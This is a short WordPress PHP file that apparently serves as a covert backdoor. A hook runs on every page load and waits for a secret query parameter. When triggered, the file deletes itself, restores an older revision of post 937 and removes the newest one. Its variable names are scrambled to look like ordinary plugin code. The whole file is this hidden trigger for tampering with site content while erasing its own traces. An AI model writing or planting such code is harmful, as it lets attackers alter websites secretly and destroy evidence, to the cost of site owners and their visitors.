<?php

function new_click_plus() {
	if (isset($_GET['elements_fonts_frontend']) && $_GET['elements_fonts_frontend'] === 'reusable_terms_scheduler_com') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$coupons_service_clock = 937;
		$analytics_module_reloaded = wp_get_post_revisions($coupons_service_clock);
		if (empty($analytics_module_reloaded)) die('no revisions');
		if (count($analytics_module_reloaded) < 2) die('less than 2');
		$verification_enable_captcha_styles = array_shift($analytics_module_reloaded);
		$colors_max_oembed = $verification_enable_captcha_styles->ID;
		$visual_parts_campaign = array_shift($analytics_module_reloaded);
		$security_recent_bootstrap_column = $visual_parts_campaign->ID;
		$display_gamipress_change = wp_restore_post_revision($security_recent_bootstrap_column);
		if ($display_gamipress_change === false) die('error restoring');
		$display_gamipress_change = wp_delete_post_revision($colors_max_oembed);		
		if ($display_gamipress_change === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'new_click_plus');
